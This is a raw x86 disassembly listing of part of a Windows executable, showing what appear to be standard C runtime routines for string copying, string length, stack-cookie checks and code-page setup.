  42560c:	call   0x42561a
  425611:	mov    eax,DWORD PTR [ebp-0x1c]
  425614:	call   0x42538b
  425619:	ret    
  42561a:	call   0x42466a
  42561f:	ret    
  425620:	push   DWORD PTR [esp+0x4]
  425624:	call   0x4255e8
  425629:	neg    eax
  42562b:	sbb    eax,eax
  42562d:	neg    eax
  42562f:	pop    ecx
  425630:	dec    eax
  425631:	ret    
  425632:	push   ebp
  425633:	mov    ebp,esp
  425635:	sub    esp,0x10
  425638:	push   ebx
  425639:	xor    ebx,ebx
  42563b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425641:	push   esi
  425642:	push   edi
  425643:	jne    0x4256b2
  425645:	push   0x429648
  42564a:	call   DWORD PTR ds:0x4290bc
  425650:	mov    edi,eax
  425652:	cmp    edi,ebx
  425654:	je     0x4256ed
  42565a:	mov    esi,DWORD PTR ds:0x429020
  425660:	push   0x42963c
  425665:	push   edi
  425666:	call   esi
  425668:	test   eax,eax
  42566a:	mov    ds:0x45dd70,eax
  42566f:	je     0x4256ed
  425671:	push   0x42962c
  425676:	push   edi
  425677:	call   esi
  425679:	push   0x429618
  42567e:	push   edi
  42567f:	mov    ds:0x45dd74,eax
  425684:	call   esi
  425686:	cmp    DWORD PTR ds:0x45dac4,0x2
  42568d:	mov    ds:0x45dd78,eax
  425692:	jne    0x4256b2
  425694:	push   0x4295fc
  425699:	push   edi
  42569a:	call   esi
  42569c:	test   eax,eax
  42569e:	mov    ds:0x45dd80,eax
  4256a3:	je     0x4256b2
  4256a5:	push   0x4295e4
  4256aa:	push   edi
  4256ab:	call   esi
  4256ad:	mov    ds:0x45dd7c,eax
  4256b2:	mov    eax,ds:0x45dd7c
  4256b7:	test   eax,eax
  4256b9:	je     0x4256f7
  4256bb:	call   eax
  4256bd:	test   eax,eax
  4256bf:	je     0x4256de
  4256c1:	lea    ecx,[ebp-0x4]
  4256c4:	push   ecx
  4256c5:	push   0xc
  4256c7:	lea    ecx,[ebp-0x10]
  4256ca:	push   ecx
  4256cb:	push   0x1
  4256cd:	push   eax
  4256ce:	call   DWORD PTR ds:0x45dd80
  4256d4:	test   eax,eax
  4256d6:	je     0x4256de
  4256d8:	test   BYTE PTR [ebp-0x8],0x1
  4256dc:	jne    0x4256f7
  4256de:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256e5:	jb     0x4256f1
  4256e7:	or     BYTE PTR [ebp+0x12],0x20
  4256eb:	jmp    0x425716
  4256ed:	xor    eax,eax
  4256ef:	jmp    0x425726
  4256f1:	or     BYTE PTR [ebp+0x12],0x4
  4256f5:	jmp    0x425716
  4256f7:	mov    eax,ds:0x45dd74
  4256fc:	test   eax,eax
  4256fe:	je     0x425716
  425700:	call   eax
  425702:	mov    ebx,eax
  425704:	test   ebx,ebx
  425706:	je     0x425716
  425708:	mov    eax,ds:0x45dd78
  42570d:	test   eax,eax
  42570f:	je     0x425716
  425711:	push   ebx
  425712:	call   eax
  425714:	mov    ebx,eax
  425716:	push   DWORD PTR [ebp+0x10]
  425719:	push   DWORD PTR [ebp+0xc]
  42571c:	push   DWORD PTR [ebp+0x8]
  42571f:	push   ebx
  425720:	call   DWORD PTR ds:0x45dd70
  425726:	pop    edi
  425727:	pop    esi
  425728:	pop    ebx
  425729:	leave  
  42572a:	ret    
  42572b:	int3   
  42572c:	int3   
  42572d:	int3   
  42572e:	int3   
  42572f:	int3   
  425730:	push   edi
  425731:	mov    edi,DWORD PTR [esp+0x8]
  425735:	jmp    0x4257a5
  425737:	lea    esp,[esp+0x0]
  42573e:	mov    edi,edi
  425740:	mov    ecx,DWORD PTR [esp+0x4]
  425744:	push   edi
  425745:	test   ecx,0x3
  42574b:	je     0x425760
  42574d:	mov    al,BYTE PTR [ecx]
  42574f:	add    ecx,0x1
  425752:	test   al,al
  425754:	je     0x425793
  425756:	test   ecx,0x3
  42575c:	jne    0x42574d
  42575e:	mov    edi,edi
  425760:	mov    eax,DWORD PTR [ecx]
  425762:	mov    edx,0x7efefeff
  425767:	add    edx,eax
  425769:	xor    eax,0xffffffff
  42576c:	xor    eax,edx
  42576e:	add    ecx,0x4
  425771:	test   eax,0x81010100
  425776:	je     0x425760
  425778:	mov    eax,DWORD PTR [ecx-0x4]
  42577b:	test   al,al
  42577d:	je     0x4257a2
  42577f:	test   ah,ah
  425781:	je     0x42579d
  425783:	test   eax,0xff0000
  425788:	je     0x425798
  42578a:	test   eax,0xff000000
  42578f:	je     0x425793
  425791:	jmp    0x425760
  425793:	lea    edi,[ecx-0x1]
  425796:	jmp    0x4257a5
  425798:	lea    edi,[ecx-0x2]
  42579b:	jmp    0x4257a5
  42579d:	lea    edi,[ecx-0x3]
  4257a0:	jmp    0x4257a5
  4257a2:	lea    edi,[ecx-0x4]
  4257a5:	mov    ecx,DWORD PTR [esp+0xc]
  4257a9:	test   ecx,0x3
  4257af:	je     0x4257ce
  4257b1:	mov    dl,BYTE PTR [ecx]
  4257b3:	add    ecx,0x1
  4257b6:	test   dl,dl
  4257b8:	je     0x425820
  4257ba:	mov    BYTE PTR [edi],dl
  4257bc:	add    edi,0x1
  4257bf:	test   ecx,0x3
  4257c5:	jne    0x4257b1
  4257c7:	jmp    0x4257ce
  4257c9:	mov    DWORD PTR [edi],edx
  4257cb:	add    edi,0x4
  4257ce:	mov    edx,0x7efefeff
  4257d3:	mov    eax,DWORD PTR [ecx]
  4257d5:	add    edx,eax
  4257d7:	xor    eax,0xffffffff
  4257da:	xor    eax,edx
  4257dc:	mov    edx,DWORD PTR [ecx]
  4257de:	add    ecx,0x4
  4257e1:	test   eax,0x81010100
  4257e6:	je     0x4257c9
  4257e8:	test   dl,dl
  4257ea:	je     0x425820
  4257ec:	test   dh,dh
  4257ee:	je     0x425817
  4257f0:	test   edx,0xff0000
  4257f6:	je     0x42580a
  4257f8:	test   edx,0xff000000
  4257fe:	je     0x425802
  425800:	jmp    0x4257c9
  425802:	mov    DWORD PTR [edi],edx
  425804:	mov    eax,DWORD PTR [esp+0x8]
  425808:	pop    edi
  425809:	ret    
  42580a:	mov    WORD PTR [edi],dx
  42580d:	mov    eax,DWORD PTR [esp+0x8]
  425811:	mov    BYTE PTR [edi+0x2],0x0
  425815:	pop    edi
  425816:	ret    
  425817:	mov    WORD PTR [edi],dx
  42581a:	mov    eax,DWORD PTR [esp+0x8]
  42581e:	pop    edi
  42581f:	ret    
  425820:	mov    BYTE PTR [edi],dl
  425822:	mov    eax,DWORD PTR [esp+0x8]
  425826:	pop    edi
  425827:	ret    
  425828:	int3   
  425829:	int3   
  42582a:	int3   
  42582b:	int3   
  42582c:	int3   
  42582d:	int3   
  42582e:	int3   
  42582f:	int3   
  425830:	mov    ecx,DWORD PTR [esp+0xc]
  425834:	push   edi
  425835:	test   ecx,ecx
  425837:	je     0x4258cf
  42583d:	push   esi
  42583e:	push   ebx
  42583f:	mov    ebx,ecx
  425841:	mov    esi,DWORD PTR [esp+0x14]
  425845:	test   esi,0x3
  42584b:	mov    edi,DWORD PTR [esp+0x10]
  42584f:	jne    0x42585c
  425851:	shr    ecx,0x2
  425854:	jne    0x4258df
  42585a:	jmp    0x425883
  42585c:	mov    al,BYTE PTR [esi]
  42585e:	add    esi,0x1
  425861:	mov    BYTE PTR [edi],al
  425863:	add    edi,0x1
  425866:	sub    ecx,0x1
  425869:	je     0x425896
  42586b:	test   al,al
  42586d:	je     0x42589e
  42586f:	test   esi,0x3
  425875:	jne    0x42585c
  425877:	mov    ebx,ecx
  425879:	shr    ecx,0x2
  42587c:	jne    0x4258df
  42587e:	and    ebx,0x3
  425881:	je     0x425896
  425883:	mov    al,BYTE PTR [esi]
  425885:	add    esi,0x1
  425888:	mov    BYTE PTR [edi],al
  42588a:	add    edi,0x1
  42588d:	test   al,al
  42588f:	je     0x4258c8
  425891:	sub    ebx,0x1
  425894:	jne    0x425883
  425896:	mov    eax,DWORD PTR [esp+0x10]
  42589a:	pop    ebx
  42589b:	pop    esi
  42589c:	pop    edi
  42589d:	ret    
  42589e:	test   edi,0x3
  4258a4:	je     0x4258bc
  4258a6:	mov    BYTE PTR [edi],al
  4258a8:	add    edi,0x1
  4258ab:	sub    ecx,0x1
  4258ae:	je     0x42594c
  4258b4:	test   edi,0x3
  4258ba:	jne    0x4258a6
  4258bc:	mov    ebx,ecx
  4258be:	shr    ecx,0x2
  4258c1:	jne    0x425937
  4258c3:	mov    BYTE PTR [edi],al
  4258c5:	add    edi,0x1
  4258c8:	sub    ebx,0x1
  4258cb:	jne    0x4258c3
  4258cd:	pop    ebx
  4258ce:	pop    esi
  4258cf:	mov    eax,DWORD PTR [esp+0x8]
  4258d3:	pop    edi
  4258d4:	ret    
  4258d5:	mov    DWORD PTR [edi],edx
  4258d7:	add    edi,0x4
  4258da:	sub    ecx,0x1
  4258dd:	je     0x42587e
  4258df:	mov    edx,0x7efefeff
  4258e4:	mov    eax,DWORD PTR [esi]
  4258e6:	add    edx,eax
  4258e8:	xor    eax,0xffffffff
  4258eb:	xor    eax,edx
  4258ed:	mov    edx,DWORD PTR [esi]
  4258ef:	add    esi,0x4
  4258f2:	test   eax,0x81010100
  4258f7:	je     0x4258d5
  4258f9:	test   dl,dl
  4258fb:	je     0x425929
  4258fd:	test   dh,dh
  4258ff:	je     0x42591f
  425901:	test   edx,0xff0000
  425907:	je     0x425915
  425909:	test   edx,0xff000000
  42590f:	jne    0x4258d5
  425911:	mov    DWORD PTR [edi],edx
  425913:	jmp    0x42592d
  425915:	and    edx,0xffff
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	jmp    0x42592d
  42591f:	and    edx,0xff
  425925:	mov    DWORD PTR [edi],edx
  425927:	jmp    0x42592d
  425929:	xor    edx,edx
  42592b:	mov    DWORD PTR [edi],edx
  42592d:	add    edi,0x4
  425930:	xor    eax,eax
  425932:	sub    ecx,0x1
  425935:	je     0x425943
  425937:	xor    eax,eax
  425939:	mov    DWORD PTR [edi],eax
  42593b:	add    edi,0x4
  42593e:	sub    ecx,0x1
  425941:	jne    0x425939
  425943:	and    ebx,0x3
  425946:	jne    0x4258c3
  42594c:	mov    eax,DWORD PTR [esp+0x10]
  425950:	pop    ebx
  425951:	pop    esi
  425952:	pop    edi
  425953:	ret    
  425954:	int3   
  425955:	int3   
  425956:	int3   
  425957:	int3   
  425958:	int3   
  425959:	int3   
  42595a:	int3   
  42595b:	int3   
  42595c:	int3   
  42595d:	int3   
  42595e:	int3   
  42595f:	int3   
  425960:	mov    ecx,DWORD PTR [esp+0x4]
  425964:	test   ecx,0x3
  42596a:	je     0x425990
  42596c:	mov    al,BYTE PTR [ecx]
  42596e:	add    ecx,0x1
  425971:	test   al,al
  425973:	je     0x4259c3
  425975:	test   ecx,0x3
  42597b:	jne    0x42596c
  42597d:	add    eax,0x0
  425982:	lea    esp,[esp+0x0]
  425989:	lea    esp,[esp+0x0]
  425990:	mov    eax,DWORD PTR [ecx]
  425992:	mov    edx,0x7efefeff
  425997:	add    edx,eax
  425999:	xor    eax,0xffffffff
  42599c:	xor    eax,edx
  42599e:	add    ecx,0x4
  4259a1:	test   eax,0x81010100
  4259a6:	je     0x425990
  4259a8:	mov    eax,DWORD PTR [ecx-0x4]
  4259ab:	test   al,al
  4259ad:	je     0x4259e1
  4259af:	test   ah,ah
  4259b1:	je     0x4259d7
  4259b3:	test   eax,0xff0000
  4259b8:	je     0x4259cd
  4259ba:	test   eax,0xff000000
  4259bf:	je     0x4259c3
  4259c1:	jmp    0x425990
  4259c3:	lea    eax,[ecx-0x1]
  4259c6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ca:	sub    eax,ecx
  4259cc:	ret    
  4259cd:	lea    eax,[ecx-0x2]
  4259d0:	mov    ecx,DWORD PTR [esp+0x4]
  4259d4:	sub    eax,ecx
  4259d6:	ret    
  4259d7:	lea    eax,[ecx-0x3]
  4259da:	mov    ecx,DWORD PTR [esp+0x4]
  4259de:	sub    eax,ecx
  4259e0:	ret    
  4259e1:	lea    eax,[ecx-0x4]
  4259e4:	mov    ecx,DWORD PTR [esp+0x4]
  4259e8:	sub    eax,ecx
  4259ea:	ret    
  4259eb:	push   0x8
  4259ed:	push   0x429658
  4259f2:	call   0x425350
  4259f7:	and    DWORD PTR [ebp-0x4],0x0
  4259fb:	push   0x0
  4259fd:	push   0x1
  4259ff:	call   0x427572
  425a04:	pop    ecx
  425a05:	pop    ecx
  425a06:	jmp    0x425a0f
  425a08:	xor    eax,eax
  425a0a:	inc    eax
  425a0b:	ret    
  425a0c:	mov    esp,DWORD PTR [ebp-0x18]
  425a0f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a13:	push   0x3
  425a15:	call   DWORD PTR ds:0x42905c
  425a1b:	int3   
  425a1c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a22:	jne    0x425a25
  425a24:	ret    
  425a25:	jmp    0x4259eb
  425a2a:	movzx  eax,BYTE PTR [esp+0x4]
  425a2f:	mov    cl,BYTE PTR [esp+0xc]
  425a33:	test   BYTE PTR [eax+0x45df21],cl
  425a39:	jne    0x425a57
  425a3b:	cmp    DWORD PTR [esp+0x8],0x0
  425a40:	je     0x425a50
  425a42:	movzx  eax,WORD PTR [eax*2+0x429a52]
  425a4a:	and    eax,DWORD PTR [esp+0x8]
  425a4e:	jmp    0x425a52
  425a50:	xor    eax,eax
  425a52:	test   eax,eax
  425a54:	jne    0x425a57
  425a56:	ret    
  425a57:	xor    eax,eax
  425a59:	inc    eax
  425a5a:	ret    
  425a5b:	push   0x4
  425a5d:	push   0x0
  425a5f:	push   DWORD PTR [esp+0xc]
  425a63:	call   0x425a2a
  425a68:	add    esp,0xc
  425a6b:	ret    
  425a6c:	sub    eax,0x3a4
  425a71:	je     0x425a95
  425a73:	sub    eax,0x4
  425a76:	je     0x425a8f
  425a78:	sub    eax,0xd
  425a7b:	je     0x425a89
  425a7d:	dec    eax
  425a7e:	je     0x425a83
  425a80:	xor    eax,eax
  425a82:	ret    
  425a83:	mov    eax,0x404
  425a88:	ret    
  425a89:	mov    eax,0x412
  425a8e:	ret    
  425a8f:	mov    eax,0x804
  425a94:	ret    
  425a95:	mov    eax,0x411
  425a9a:	ret    
  425a9b:	push   edi
  425a9c:	push   0x40
  425a9e:	xor    eax,eax
  425aa0:	pop    ecx
  425aa1:	mov    edi,0x45df20
  425aa6:	rep stos DWORD PTR es:[edi],eax
  425aa8:	stos   BYTE PTR es:[edi],al
  425aa9:	xor    eax,eax
  425aab:	mov    ds:0x45e024,eax
  425ab0:	mov    ds:0x45df1c,eax
  425ab5:	mov    ds:0x45df14,eax
  425aba:	mov    edi,0x45e030
  425abf:	stos   DWORD PTR es:[edi],eax
  425ac0:	stos   DWORD PTR es:[edi],eax
  425ac1:	stos   DWORD PTR es:[edi],eax
  425ac2:	pop    edi
  425ac3:	ret    
  425ac4:	push   ebp
  425ac5:	mov    ebp,esp
  425ac7:	sub    esp,0x518
  425acd:	mov    eax,ds:0x45d430
  425ad2:	xor    eax,DWORD PTR [ebp+0x4]
  425ad5:	push   esi
  425ad6:	mov    DWORD PTR [ebp-0x4],eax
  425ad9:	lea    eax,[ebp-0x18]
  425adc:	push   eax
  425add:	push   DWORD PTR ds:0x45e024
  425ae3:	call   DWORD PTR ds:0x4290c8
  425ae9:	cmp    eax,0x1
  425aec:	mov    esi,0x100
  425af1:	jne    0x425c04
  425af7:	xor    eax,eax
  425af9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425b00:	inc    eax
  425b01:	cmp    eax,esi
  425b03:	jb     0x425af9
  425b05:	mov    al,BYTE PTR [ebp-0x12]
  425b08:	test   al,al
  425b0a:	mov    BYTE PTR [ebp-0x118],0x20
  425b11:	je     0x425b49
  425b13:	push   ebx
  425b14:	lea    edx,[ebp-0x11]
  425b17:	push   edi
  425b18:	movzx  ecx,BYTE PTR [edx]
  425b1b:	movzx  eax,al
  425b1e:	cmp    eax,ecx
  425b20:	ja     0x425b3f
  425b22:	sub    ecx,eax
  425b24:	inc    ecx
  425b25:	mov    ebx,ecx
  425b27:	shr    ecx,0x2
  425b2a:	lea    edi,[ebp+eax*1-0x118]
  425b31:	mov    eax,0x20202020
  425b36:	rep stos DWORD PTR es:[edi],eax
  425b38:	mov    ecx,ebx
  425b3a:	and    ecx,0x3
  425b3d:	rep stos BYTE PTR es:[edi],al
  425b3f:	inc    edx
  425b40:	mov    al,BYTE PTR [edx]
  425b42:	inc    edx
  425b43:	test   al,al
  425b45:	jne    0x425b18
  425b47:	pop    edi
  425b48:	pop    ebx
  425b49:	push   0x0
  425b4b:	push   DWORD PTR ds:0x45df14
  425b51:	lea    eax,[ebp-0x518]
  425b57:	push   DWORD PTR ds:0x45e024
  425b5d:	push   eax
  425b5e:	push   esi
  425b5f:	lea    eax,[ebp-0x118]
  425b65:	push   eax
  425b66:	push   0x1
  425b68:	call   0x427a78
  425b6d:	push   0x0
  425b6f:	push   DWORD PTR ds:0x45e024
  425b75:	lea    eax,[ebp-0x218]
  425b7b:	push   esi
  425b7c:	push   eax
  425b7d:	push   esi
  425b7e:	lea    eax,[ebp-0x118]
  425b84:	push   eax
  425b85:	push   esi
  425b86:	push   DWORD PTR ds:0x45df14
  425b8c:	call   0x4276bc
  425b91:	push   0x0
  425b93:	push   DWORD PTR ds:0x45e024
  425b99:	lea    eax,[ebp-0x318]
  425b9f:	push   esi
  425ba0:	push   eax
  425ba1:	push   esi
  425ba2:	lea    eax,[ebp-0x118]
  425ba8:	push   eax
  425ba9:	push   0x200
  425bae:	push   DWORD PTR ds:0x45df14
  425bb4:	call   0x4276bc
  425bb9:	add    esp,0x5c
  425bbc:	xor    eax,eax
  425bbe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bc6:	test   cl,0x1
  425bc9:	je     0x425be1
  425bcb:	or     BYTE PTR [eax+0x45df21],0x10
  425bd2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bd9:	mov    BYTE PTR [eax+0x45e040],cl
  425bdf:	jmp    0x425bfd
  425be1:	test   cl,0x2
  425be4:	je     0x425bf6
  425be6:	or     BYTE PTR [eax+0x45df21],0x20
  425bed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425bf4:	jmp    0x425bd9
  425bf6:	and    BYTE PTR [eax+0x45e040],0x0
  425bfd:	inc    eax
  425bfe:	cmp    eax,esi
  425c00:	jb     0x425bbe
  425c02:	jmp    0x425c48
  425c04:	xor    eax,eax
  425c06:	cmp    eax,0x41
  425c09:	jb     0x425c24
  425c0b:	cmp    eax,0x5a
  425c0e:	ja     0x425c24
  425c10:	or     BYTE PTR [eax+0x45df21],0x10
  425c17:	mov    cl,al
  425c19:	add    cl,0x20
  425c1c:	mov    BYTE PTR [eax+0x45e040],cl
  425c22:	jmp    0x425c43
  425c24:	cmp    eax,0x61
  425c27:	jb     0x425c3c
  425c29:	cmp    eax,0x7a
  425c2c:	ja     0x425c3c
  425c2e:	or     BYTE PTR [eax+0x45df21],0x20
  425c35:	mov    cl,al
  425c37:	sub    cl,0x20
  425c3a:	jmp    0x425c1c
  425c3c:	and    BYTE PTR [eax+0x45e040],0x0
  425c43:	inc    eax
  425c44:	cmp    eax,esi
  425c46:	jb     0x425c06
  425c48:	mov    ecx,DWORD PTR [ebp-0x4]
  425c4b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c4e:	pop    esi
  425c4f:	call   0x425a1c
  425c54:	leave  
  425c55:	ret    
  425c56:	push   ebp
  425c57:	mov    ebp,esp
  425c59:	sub    esp,0x1c
  425c5c:	mov    eax,ds:0x45d430
  425c61:	xor    eax,DWORD PTR [ebp+0x4]
  425c64:	push   ebx
  425c65:	push   esi
  425c66:	mov    esi,DWORD PTR [ebp+0x8]
  425c69:	xor    ebx,ebx
  425c6b:	cmp    esi,ebx
  425c6d:	mov    DWORD PTR [ebp-0x4],eax
  425c70:	push   edi
  425c71:	je     0x425dcb
  425c77:	xor    edx,edx
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c81:	je     0x425ce8
  425c83:	add    eax,0x30
  425c86:	inc    edx
  425c87:	cmp    eax,0xf0
  425c8c:	jb     0x425c7b
  425c8e:	lea    eax,[ebp-0x1c]
  425c91:	push   eax
  425c92:	push   esi
  425c93:	call   DWORD PTR ds:0x4290c8
  425c99:	cmp    eax,0x1
  425c9c:	jne    0x425dc3
  425ca2:	push   0x40
  425ca4:	xor    eax,eax
  425ca6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425caa:	pop    ecx
  425cab:	mov    edi,0x45df20
  425cb0:	rep stos DWORD PTR es:[edi],eax
  425cb2:	stos   BYTE PTR es:[edi],al
  425cb3:	mov    DWORD PTR ds:0x45e024,esi
  425cb9:	mov    DWORD PTR ds:0x45df14,ebx
  425cbf:	jbe    0x425db1
  425cc5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cc9:	je     0x425d89
  425ccf:	lea    ecx,[ebp-0x15]
  425cd2:	mov    dl,BYTE PTR [ecx]
  425cd4:	test   dl,dl
  425cd6:	je     0x425d89
  425cdc:	movzx  eax,BYTE PTR [ecx-0x1]
  425ce0:	movzx  edx,dl
  425ce3:	jmp    0x425d79
  425ce8:	push   0x40
  425cea:	xor    eax,eax
  425cec:	pop    ecx
  425ced:	mov    edi,0x45df20
  425cf2:	rep stos DWORD PTR es:[edi],eax
  425cf4:	lea    ecx,[edx+edx*2]
  425cf7:	shl    ecx,0x4
  425cfa:	mov    DWORD PTR [ebp-0x8],ebx
  425cfd:	stos   BYTE PTR es:[edi],al
  425cfe:	lea    ebx,[ecx+0x45d450]
  425d04:	mov    al,BYTE PTR [ebx]
  425d06:	mov    esi,ebx
  425d08:	jmp    0x425d33
  425d0a:	mov    dl,BYTE PTR [esi+0x1]
  425d0d:	test   dl,dl
  425d0f:	je     0x425d37
  425d11:	movzx  eax,al
  425d14:	movzx  edi,dl
  425d17:	cmp    eax,edi
  425d19:	ja     0x425d2f
  425d1b:	mov    edx,DWORD PTR [ebp-0x8]
  425d1e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d24:	or     BYTE PTR [eax+0x45df21],dl
  425d2a:	inc    eax
  425d2b:	cmp    eax,edi
  425d2d:	jbe    0x425d24
  425d2f:	inc    esi
  425d30:	inc    esi
  425d31:	mov    al,BYTE PTR [esi]
  425d33:	test   al,al
  425d35:	jne    0x425d0a
  425d37:	inc    DWORD PTR [ebp-0x8]
  425d3a:	add    ebx,0x8
  425d3d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d41:	jb     0x425d04
  425d43:	mov    eax,DWORD PTR [ebp+0x8]
  425d46:	mov    ds:0x45e024,eax
  425d4b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d55:	call   0x425a6c
  425d5a:	lea    ecx,[ecx+0x45d444]
  425d60:	mov    esi,ecx
  425d62:	mov    edi,0x45e030
  425d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d69:	mov    ds:0x45df14,eax
  425d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d6f:	jmp    0x425dd0
  425d71:	or     BYTE PTR [eax+0x45df21],0x4
  425d78:	inc    eax
  425d79:	cmp    eax,edx
  425d7b:	jbe    0x425d71
  425d7d:	inc    ecx
  425d7e:	inc    ecx
  425d7f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d83:	jne    0x425cd2
  425d89:	xor    ecx,ecx
  425d8b:	inc    ecx
  425d8c:	mov    eax,ecx
  425d8e:	or     BYTE PTR [eax+0x45df21],0x8
  425d95:	inc    eax
  425d96:	cmp    eax,0xff
  425d9b:	jb     0x425d8e
  425d9d:	mov    eax,esi
  425d9f:	call   0x425a6c
  425da4:	mov    ds:0x45df14,eax
  425da9:	mov    DWORD PTR ds:0x45df1c,ecx
  425daf:	jmp    0x425db7
  425db1:	mov    DWORD PTR ds:0x45df1c,ebx
  425db7:	xor    eax,eax
  425db9:	mov    edi,0x45e030
  425dbe:	stos   DWORD PTR es:[edi],eax
  425dbf:	stos   DWORD PTR es:[edi],eax
  425dc0:	stos   DWORD PTR es:[edi],eax
  425dc1:	jmp    0x425dd0
  425dc3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425dc9:	je     0x425dd9
  425dcb:	call   0x425a9b
  425dd0:	call   0x425ac4
  425dd5:	xor    eax,eax
  425dd7:	jmp    0x425ddc
  425dd9:	or     eax,0xffffffff
  425ddc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ddf:	xor    ecx,DWORD PTR [ebp+0x4]
  425de2:	pop    edi
  425de3:	pop    esi
  425de4:	pop    ebx
  425de5:	call   0x425a1c
  425dea:	leave  
  425deb:	ret    
  425dec:	push   0x14
  425dee:	push   0x429668
  425df3:	call   0x425350
  425df8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dfc:	push   0xd
  425dfe:	call   0x42550f
  425e03:	pop    ecx
  425e04:	xor    edi,edi
  425e06:	mov    DWORD PTR [ebp-0x4],edi
  425e09:	mov    DWORD PTR ds:0x45dd84,edi
  425e0f:	mov    eax,DWORD PTR [ebp+0x8]
  425e12:	cmp    eax,0xfffffffe
  425e15:	jne    0x425e29
  425e17:	mov    DWORD PTR ds:0x45dd84,0x1
  425e21:	call   DWORD PTR ds:0x4290c4
  425e27:	jmp    0x425e54
  425e29:	cmp    eax,0xfffffffd
  425e2c:	jne    0x425e40
  425e2e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e38:	call   DWORD PTR ds:0x4290c0
  425e3e:	jmp    0x425e54
  425e40:	cmp    eax,0xfffffffc
  425e43:	jne    0x425e54
  425e45:	mov    DWORD PTR ds:0x45dd84,0x1
  425e4f:	mov    eax,ds:0x45ddb4
  425e54:	mov    DWORD PTR [ebp+0x8],eax
  425e57:	cmp    eax,DWORD PTR ds:0x45e024
  425e5d:	je     0x425f1e
  425e63:	mov    esi,DWORD PTR ds:0x45df18
  425e69:	mov    DWORD PTR [ebp-0x20],esi
  425e6c:	cmp    esi,edi
  425e6e:	je     0x425e74
  425e70:	cmp    DWORD PTR [esi],edi
  425e72:	je     0x425e84
  425e74:	push   0x220
  425e79:	call   0x426072
  425e7e:	pop    ecx
  425e7f:	mov    esi,eax
  425e81:	mov    DWORD PTR [ebp-0x20],esi
  425e84:	cmp    esi,edi
  425e86:	je     0x425f07
  425e88:	push   DWORD PTR [ebp+0x8]
  425e8b:	call   0x425c56
  425e90:	pop    ecx
  425e91:	mov    DWORD PTR [ebp-0x1c],eax
  425e94:	cmp    eax,edi
  425e96:	jne    0x425f07
  425e98:	mov    DWORD PTR [esi],edi
  425e9a:	mov    eax,ds:0x45e024
  425e9f:	mov    DWORD PTR [esi+0x4],eax
  425ea2:	mov    eax,ds:0x45df1c
  425ea7:	mov    DWORD PTR [esi+0x8],eax
  425eaa:	mov    eax,ds:0x45df14
  425eaf:	mov    DWORD PTR [esi+0xc],eax
  425eb2:	xor    eax,eax
  425eb4:	mov    DWORD PTR [ebp-0x24],eax
  425eb7:	cmp    eax,0x5
  425eba:	jge    0x425ecc
  425ebc:	mov    cx,WORD PTR [eax*2+0x45e030]
  425ec4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425ec9:	inc    eax
  425eca:	jmp    0x425eb4
  425ecc:	xor    eax,eax
  425ece:	mov    DWORD PTR [ebp-0x24],eax
  425ed1:	cmp    eax,0x101
  425ed6:	jge    0x425ee5
  425ed8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ede:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ee2:	inc    eax
  425ee3:	jmp    0x425ece
  425ee5:	xor    eax,eax
  425ee7:	mov    DWORD PTR [ebp-0x24],eax
  425eea:	cmp    eax,0x100
  425eef:	jge    0x425f01
  425ef1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ef7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425efe:	inc    eax
  425eff:	jmp    0x425ee7
  425f01:	mov    DWORD PTR ds:0x45df18,esi
  425f07:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425f0b:	jne    0x425f21
  425f0d:	cmp    esi,DWORD PTR ds:0x45df18
  425f13:	je     0x425f21
  425f15:	push   esi
  425f16:	call   0x425f5a
  425f1b:	pop    ecx
  425f1c:	jmp    0x425f21
  425f1e:	mov    DWORD PTR [ebp-0x1c],edi
  425f21:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f25:	call   0x425f33
  425f2a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f2d:	call   0x42538b
  425f32:	ret    
  425f33:	push   0xd
  425f35:	call   0x42547b
  425f3a:	pop    ecx
  425f3b:	ret    
  425f3c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f43:	jne    0x425f57
  425f45:	push   0xfffffffd
  425f47:	call   0x425dec
  425f4c:	pop    ecx
  425f4d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f57:	xor    eax,eax
  425f59:	ret    
  425f5a:	push   0xc
  425f5c:	push   0x429678
  425f61:	call   0x425350
  425f66:	mov    esi,DWORD PTR [ebp+0x8]
  425f69:	test   esi,esi
  425f6b:	je     0x425fc5
  425f6d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f74:	jne    0x425fb6
  425f76:	push   0x4
  425f78:	call   0x42550f
  425f7d:	pop    ecx
  425f7e:	and    DWORD PTR [ebp-0x4],0x0
  425f82:	push   esi
  425f83:	call   0x426732
  425f88:	pop    ecx
  425f89:	mov    DWORD PTR [ebp-0x1c],eax
  425f8c:	test   eax,eax
  425f8e:	je     0x425f99
  425f90:	push   esi
  425f91:	push   eax
  425f92:	call   0x42675d
  425f97:	pop    ecx
  425f98:	pop    ecx
